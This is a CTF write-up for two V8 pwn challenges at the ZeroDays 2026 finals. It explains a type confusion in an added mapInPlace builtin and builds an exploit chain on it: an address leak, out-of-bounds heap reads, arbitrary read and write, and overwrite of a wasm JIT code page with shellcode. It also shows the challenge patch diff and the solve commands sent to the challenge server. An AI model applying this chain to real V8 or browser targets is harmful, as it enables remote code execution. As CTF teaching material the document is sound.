@@ -1,0 +1,393 @@
+---
+title: "ZeroDays CTF Finals 2026 Writeups"
+description: "Writeups for the on-site finals"
+date: 10-08-2025
+tags: ['writeup', '2025', 'rev', 'pwn']
+authors: ['tlsbollei']
+image: './zerodays.png'
+---
+
+import Callout from '@/components/Callout.astro'
+import { Icon } from 'astro-icon/components'
+
+## pwn - MIP (9 solves)
+
+this was a V8 pwn challenge. the bug can be seen in the following snippet:
+
+```cpp
+Handle<FixedDoubleArray> elements = handle(Cast<FixedDoubleArray>(array->elements()), isolate);
+double current = elements->get_scalar(i);
+elements->set(i, Object::NumberValue(*result));
+```
+
+its job is simple, iterate over an array, call a js callback on each element, write the result back. however, it unconditionally casts ```array->elements()``` to ```FixedDoubleArray``` regardles of what kind of array you actually passed in. if you pass a real double array like ```[1.1, 2.2]```, this is fine. however, if you pass an object array like ```[object1, object2]```, the real backing store is a ```FixedArray``` of compressed tagged pointers and the cast is completely wrong. this bug is however quite subtle, nevertheless it matters enormously because of pointer compression which V8 enables on 64 bit platforms.
+
+### pointer compression on V8 and type confusion
+
+```FixedArray``` is an object array and it can hold 4 bytes per slot. ```FixedDoubleArray``` is a double array and it can hold 8 bytes per slot. so when the code calls ```get_scalar(i)```, it reads 8 bytes from a location that only has 4 byte slots. and when it calls ```set(i, x)```, it writes 8 bytes back across the 4 byte slots. you now have a 64 bit read/write over memory that V8 believes is a tagged object array, even though it is not. this single mismatch, also known as type confusion, is our exploitation primitive and the foundation of the entire exploit.
+
+### address leak via addrofPair
+
+the first thing we need before we can do anything is to know where objects live in memory, for which we need a dedicated leka helper. thankfully, the type confusion gives this to us for free:
+
+```js
+function addrofPair(a, b) {
+  const pair = [a, b];
+  let leak = 0n;
+  pair.mapInPlace((x, i) => {
+    if (i === 0) leak = ftoi(x);
+    return x;
+  });
+  return [leak & 0xffffffffn, leak >> 32n];
+}
+```
+
+when you create ```[a, b]```, V8 allocates a ```FixedArray``` backing store that looks like this in raw memory:
+
+```
+Offset   Size   Contents
++0x00    8      FixedArray header (map + length)
++0x08    4      compressed tagged pointer -> a
++0x0c    4      compressed tagged pointer -> b
+```
+
+the code thinks this is a ```FixedDoubleArray``` and calls ```get_scalar(0)```, which reads 8 bytes starting at offset ```+0x08 ```. those 8 bytes are not a double, they are two 4 byte pointers sitting side by side. the callback recieves them fused into one IEEE-754 float. ```ftoi()``` reinterprets tat bit pattern as a raw 64 bit integer, and we then split it into the first low 32 bits, which is the compressed heap address of ```a```, and the high 32 bits, which is the compressed heap address of ```b```. two object addresses, zero special privileges needed. the exploit only trusts ```i==0``` in the callback because index 1 would try to read from ```+0x10``` which is already past the real end of the 2 slot array (the OOB starts at index 1)
+
+### out-of-bounds heap scan
+
+one address leak is useful, but what we really need is a way to navigate the heap. for that, we need to be able to read memory past the end of our array. this exploitation primitive uses the same bug but with a larger array:
+
+```js
+const corrupt = Array(0x40).fill(marker);
+```
+
+this creates a real ```FixedArray``` of 64 slots. the real ```FixedArray[0x40]``` has a header size of 8 bytes, the payload ```64x4=256``` bytes, therefore a grand total of ```264 (0x108)``` bytes. the bug, however, sees ```FixedDoubleArray[0x40]```. this also has a header size of 8 bytes, but the payload size is ```64 x 8``` which amounts to ```520 (0x208)``` bytes. so the last legitimate in bounds fake double index is 31 (reading bytes ```0x108``` - ```0x10f```). index 32 starts reading at byte ```0x108``` which is exactly one byte past the end of the real array, into whatever V8 allocated next in memory. we write the scan in the exploit as follows:
+
+```js
+corrupt.mapInPlace((x) => {
+  leaks.push(ftoi(x));
+  return x;  // write back 1:1 what we actually read
+});
+```
+
+by returning x, we write the exact same 8 bytes that were  just read, which does not meaningfully change the memory. this lets us safely walk adjacent heap objects and inspect them before we comit to actually corrupting anything.
+
+### finding the victim object
+
+```
+const fltvictim = [
+  1.1111111111111112,   // IEEE-754 0x3ff1c71c71c71c72
+  2.2222222222222223,   // IEEE-754 0x4001c71c71c71c72
+  3.3333333333333335,   // IEEE-754 0x400aaaaaaaaaaaab
+  4.444444444444445,    // IEEE-754 0x4011c71c71c71c72
+];
+```
+
+the OOB scan searches for that exact 4 word signature. once found, the exploit assumes the next words are the JSArray header for that array. this works because V8 young-generation allocation tends to place fresh allocations close together, and the scan does not assume an absolute address, only a recognizable local pattern.
+
+### exact JSArray layout used
+
+```js
+const arrayHeader = locateFloatVictim(leaks);
+const savedWord = leaks[arrayHeader + 1];
+```
+
+why ```arrayHeader + 1```? becauser under pointer compression a JSArray header is effectively four 4-byte words:
+
+```
++0x00 map
++0x04 properties
++0x08 elements
++0x0c length (Smi)
+```
+
+if we read as 64 bit chunks, that becomes
+
+```
+word 0 at +0x00 = [map | properties]
+word 1 at +0x08 = [elements | length]
+```
+
+and after debugging, we see that the four sentinel doubles looked like
+
+```
+0x00000008_0108ba15
+```
+
+we can interpret this as ```low 32 bits 0x0108ba15 = compressed tagged pointer to the FixedDoubleArray``` , ```high 32 bits 0x00000008 = Smi(4), because V8 Smis are shifted left by 1```. this is why we build a replacement word as
+
+```js
+(smi(length) << 32n) | (taggedPtr & 0xffffffffn)
+```
+
+### arbitrary read and write
+
+now that we have the victims header in our hands, we need to overwrite word 1 of the victim header (see above, te elements pointer and length field) with a pointer we control:
+
+```js
+function setElements(taggedPtr, length) {
+  const newWord = (smi(length) << 32n) | (taggedPtr & 0xffffffffn);
+  writeWord(arrayHeader + 1, newWord);
+}
+```
+
+setElements(taggedPtr, length) rewrites the float arrays elements pointer and length, so fltvictim[0] no longer reads its original backing store, but whatever tagged heap pointer I chose. critical small detail - when V8 reads ```fltVictim[0]```, it does not read directly from the elements pointer. instead, it computes:
+
+```
+address = untag(elements_ptr) + FixedDoubleArrayHeaderSize + index * 8
+        = untag(elements_ptr) + 8 + 0
+        = untag(elements_ptr) + 8
+```
+
+so if we want to read from target address ```T```, we must store ```T-8``` as the fake elements pointer. the ```-8``` compensates for V8 automatically skipping the ```FixedDoubleArray``` before reading element 0. this is our functional read/write pair inside of the exploit: 
+
+```js
+read64(target) {
+  setElements(target - 8n, 1);
+  const value = ftoi(floatVictim[0]);
+  setElements(savedElements, savedLength);  
+  return value;
+}
+
+write64(target, value) {
+  setElements(target - 8n, 1);
+  floatVictim[0] = itof(value);
+  setElements(savedElements, savedLength);  
+}
+```
+
+we now have an arbitrary 64-bit read/write anywhere inside the V8 heap cage. we can read or write any field of any object V8 knows about.
+
+### escaping the heap cage through wasm code page
+
+in-cage R/W is powerful but not enough. the heap cage is not marked as executable, the os marks those pages as data only. to run shellcode, we need to reach executable memory. the classic route is to use WebAssembly. when V8 JIT-compiles a Wasm module, it allocates a separate page outside of the heap cage, maps it executable and writes the compiled native code there. that page is our target. therefore, the plan looks as follows:
+
+```
+  1. create an ArrayBuffer
+  2. ceate a tiny wasm instance
+  3. leak both addresses with addrofPair
+  4. read fields out of the wasm instance until I get the wasm code page pointer
+  5. overwrite the ArrayBuffers backing_store pointer so a Uint8Array view becomes an arbitrary raw-
+     memory view
+```
+first, we need to leak the wasm instance address:
+
+```js
+const [instanceAddr, abAddr] = addrofPair(wasmInstance, ab);
+```
+
+```addrofPair``` givess us both the ```WasmInstance``` compressed address and the ```ArrayBuffer``` compressed address in one shot. then, we need to walk the pointer chain to the code page. the ```WasmInstanceObject``` in memory under pointer compression looks something like this:
+
+```
++0x00  map          (4 bytes)
++0x04  properties   (4 bytes)
++0x08  elements     (4 bytes)
++0x0c  trusted_data (4 bytes)   <- target
++0x10  module_object(4 bytes)
++0x14  exports_object(4 bytes)
+```
+
+reading 8 bytes at ```+0x0c``` gives us ```[trusted_data | module_object]``` fused together. masking the low 32 bits isolates the ```trusted_data``` pointer:
+
+```js
+const trustedData = rw.read64(instanceAddr + 12n) & 0xffffffffn;
+```
+
+the +12 is ```0x0c``` in decimal. from ```WasmTrustedInstanceData```, the code page pointer sits at offset ```+0x28 (decimal 40)```. this was found  by dumping all fields from the live ```trustedData``` object and looking for a value that was page aligned (low 12 bits all zero), a valid canonical user space 64 bit address and consistent with the wasm disassembly.
+
+```
+const codePage = rw.read64(trustedData + 40n);
+```
+
+now we redirect the ```ArrayBuffer``` backing store. a ```JSArrayBuffer``` in memory has its ```backing_store``` at offset ```+0x24 (decimal 36)```. this was found by dumping a live ```JSArrayBuffer``` and correlating the fields with ```%DebugPrint``` and its printed ```backing_store:``` value:
+
+```
+rw.write64(abAddr + 36n, codePage);
+```
+
+this is the JSArrayBuffer.backing_store field. after this write, ```new Uint8Array(ab)``` is no longer a view over normal heap memory, but a raw byte view directly over the Wasm JIT code page. we can now read and write native executable code.
+
+### finding and patching the WASM thunk
+
+the WASM function body itself was not directly at a simple offset from the page start. instead, near the end of the page there is a lazy entry thnk which is  a small stub V8 generates for dispatch. its signature is a recognizable byte pattern:
+
+```
+68 00 00 00 00 e9 ...
+```
+
+which is basically just ```push 0; jmp```, a simple thunk prologue. the exploit incorporates a function called ```findThunk()``` which scans the Uint8Array view of the code page lookins for those bytes. i saved this in an independent file called ```test_exec.js```, which sent out three probes. the first zeroed out bytes at ```0x980```. the result was a process crash at ```codePage + 0x980```. this proves execution actually reached the address when ```wasm.main()``` was called. the second probe filled ```0x980```-```0x9c0``` with ```0x90``` with NOP instructions and place illegal instructions ```UD2``` at ```0x9c0```. the result was a ```SIGILL``` at ```codePage + 0x9c0``` which proves exec starts near ```0x980``` and falls through the NOP sled to ```0x9c0```. the third and final probe replaced our illegal ```UD2``` instructions with real shellcode, which confirmed RIP control. 
+
+```
+const thunkOff = findThunk(page);
+const shellOff = thunkOff + 0x40;
+
+for (let i = thunkOff; i < shellOff; i++) page[i] = 0x90;
+for (let i = 0; i < shellcode.length; i++) page[shellOff + i] = shellcode[i];
+wasm.main();
+```
+
+then the rest of the solve was just repeatedly probing the service to find the shellcode to insert. the recon shellcode which used ```pwd``` and ```ls -la / . /home /root /app /challenge``` showed ```--ws--x--x 1 root root 900352 ... readflag```, so instead of ```/bin/sh``` we use  ```execve("/readflag")``` for simplicity.
+
+### solve and flag
+
+```
+λ printf '%s\n' "$(base64 -w0 solve.js)" | nc 18.201.150.183 1337
+base64 encoded exploit:
+can you MIP hard enough? :0
+ZeroDays{M1P_2_f0r_34ch_w4s_n0t_th3_pr0bl3m_h3r3_4c628ef0}
+```
+
+## pwn - MIP revenge (4 solves)
+
+fun outcome - this challenge is the same identical challenge, however it removes some unused cage-base helpers, but it still keeps the same ```mapInPlace``` type confusion, so literally running the same exploit but now turned against the new host and port again gives us the second flag XD
+```
+diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
+index 0755eecd..436f8ec6 100644
+--- a/src/builtins/builtins-array.cc
++++ b/src/builtins/builtins-array.cc
+@@ -368,6 +368,58 @@ V8_WARN_UNUSED_RESULT bool TryFastArrayFill(
+ }
+ }  // namespace
+ 
++BUILTIN(ArrayMapInPlace) {
++  HandleScope scope(isolate);
++
++  DirectHandle<JSReceiver> receiver;
++  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++      isolate, receiver,
++      Object::ToObject(isolate, args.receiver()));
++  DirectHandle<JSArray> array = Cast<JSArray>(receiver);
++
++  if (args.length() < 2 || !IsCallable(*args.at(1))) {
++    THROW_NEW_ERROR_RETURN_FAILURE(
++        isolate,
++        NewTypeError(MessageTemplate::kCalledNonCallable,
++                     isolate->factory()->NewStringFromAsciiChecked(
++                         "mapInPlace callback")));
++  }
++  DirectHandle<Object> callback = args.at(1);
++  uint32_t length =
++      static_cast<uint32_t>(Object::NumberValue(array->length()));
++
++  Handle<FixedDoubleArray> elements =
++      handle(Cast<FixedDoubleArray>(array->elements()), isolate);
++
++  for (uint32_t i = 0; i < length; i++) {
++    double current = elements->get_scalar(i);
++    DirectHandle<Object> current_obj =
++        isolate->factory()->NewHeapNumber(current);
++
++    DirectHandle<Object> argv[] = {
++        current_obj,
++        DirectHandle<Object>(handle(Smi::FromInt(i), isolate)),
++        array,
++    };
++    DirectHandle<Object> result;
++    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++        isolate, result,
++        Execution::Call(isolate, callback, receiver,
++                        base::VectorOf(argv)));
++
++    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
++        isolate, result, Object::ToNumber(isolate, result));
++    elements->set(i, Object::NumberValue(*result));
++  }
++
++  return *array;
++}
++
+ // https://tc39.es/ecma262/#sec-array.prototype.fill
+ BUILTIN(ArrayPrototypeFill) {
+   HandleScope scope(isolate);
+diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
+index 830e2a6f..1a9cc036 100644
+--- a/src/builtins/builtins-definitions.h
++++ b/src/builtins/builtins-definitions.h
+@@ -518,6 +518,7 @@ constexpr int kGearboxGenericBuiltinIdOffset = -2;
+   TFC(ArrayNArgumentsConstructor, ArrayNArgumentsConstructor)                  \
+   CPP(ArrayConcat, kDontAdaptArgumentsSentinel)                                \
+   CPP(ArrayPrototypeFill, kDontAdaptArgumentsSentinel)                         \
++  CPP(ArrayMapInPlace, kDontAdaptArgumentsSentinel)                            \
+   TFS(ArrayIncludesSmi, NeedsContext::kYes, kElements, kSearchElement,         \
+       kLength, kFromIndex)                                                     \
+   TFS(ArrayIncludesSmiOrObject, NeedsContext::kYes, kElements, kSearchElement, \
+diff --git a/src/d8/d8.cc b/src/d8/d8.cc
+index 93e1056e..46b827be 100644
+--- a/src/d8/d8.cc
++++ b/src/d8/d8.cc
+@@ -4271,52 +4271,9 @@ Local<FunctionTemplate> Shell::CreateNodeTemplates(
+ 
+ Local<ObjectTemplate> Shell::CreateGlobalTemplate(Isolate* isolate) {
+   Local<ObjectTemplate> global_template = ObjectTemplate::New(isolate);
+-  global_template->Set(Symbol::GetToStringTag(isolate),
+-                       String::NewFromUtf8Literal(isolate, "global"));
+   global_template->Set(isolate, "onerror", v8::Null(isolate));
+-  global_template->Set(isolate, "version",
+-                       FunctionTemplate::New(isolate, Version));
+-
+-  global_template->Set(isolate, "print", FunctionTemplate::New(isolate, Print));
+-  global_template->Set(isolate, "printErr",
+-                       FunctionTemplate::New(isolate, PrintErr));
+-  global_template->Set(isolate, "write",
+-                       FunctionTemplate::New(isolate, WriteStdout));
+-  if (!i::v8_flags.fuzzing) {
+-    global_template->Set(isolate, "writeFile",
+-                         FunctionTemplate::New(isolate, WriteFile));
+-  }
+-  global_template->Set(isolate, "read",
+-                       FunctionTemplate::New(isolate, ReadFile));
+-  global_template->Set(isolate, "readbuffer",
+-                       FunctionTemplate::New(isolate, ReadBuffer));
+-  global_template->Set(isolate, "readline",
+-                       FunctionTemplate::New(isolate, ReadLine));
+-  global_template->Set(isolate, "load",
+-                       FunctionTemplate::New(isolate, ExecuteFile));
+   global_template->Set(isolate, "setTimeout",
+                        FunctionTemplate::New(isolate, SetTimeout));
+-  // Some Emscripten-generated code tries to call 'quit', which in turn would
+-  // call C's exit(). This would lead to memory leaks, because there is no way
+-  // we can terminate cleanly then, so we need a way to hide 'quit'.
+-  if (!options.omit_quit) {
+-    global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
+-  }
+-  global_template->Set(isolate, "Realm", Shell::CreateRealmTemplate(isolate));
+-  global_template->Set(isolate, "performance",
+-                       Shell::CreatePerformanceTemplate(isolate));
+-  global_template->Set(isolate, "Worker", Shell::CreateWorkerTemplate(isolate));
+-
+-  // Prevent fuzzers from creating side effects.
+-  if (!i::v8_flags.fuzzing) {
+-    global_template->Set(isolate, "os", Shell::CreateOSTemplate(isolate));
+-  }
+-  global_template->Set(isolate, "d8", Shell::CreateD8Template(isolate));
+-
+-  if (i::v8_flags.expose_async_hooks) {
+-    global_template->Set(isolate, "async_hooks",
+-                         Shell::CreateAsyncHookTemplate(isolate));
+-  }
+ 
+   return global_template;
+ }
+diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
+index 1b68fc20..eac8aad3 100644
+--- a/src/init/bootstrapper.cc
++++ b/src/init/bootstrapper.cc
+@@ -2408,6 +2408,8 @@ void Genesis::InitializeGlobal(DirectHandle<JSGlobalObject> global_object,
+                           kAdapt);
+     SimpleInstallFunction(isolate_, proto, "concat",
+                           Builtin::kArrayPrototypeConcat, 1, kDontAdapt);
++    SimpleInstallFunction(isolate_, proto, "mapInPlace",
++                          Builtin::kArrayMapInPlace, 1, kDontAdapt);
+     SimpleInstallFunction(isolate_, proto, "copyWithin",
+                           Builtin::kArrayPrototypeCopyWithin, 2, kDontAdapt);
+     SimpleInstallFunction(isolate_, proto, "fill", Builtin::kArrayPrototypeFill,
+```
+
+### solve and flag
+
+```
+λ printf '%s\n' "$(base64 -w0 solve.js)" | nc 18.201.150.183 1339
+base64 encoded exploit:
+can you MIP hard enough? :0
+ZeroDays{M1P_1_b3l1ev3_f0re4ch_1s_s4f3r_4c628ef0}
+```
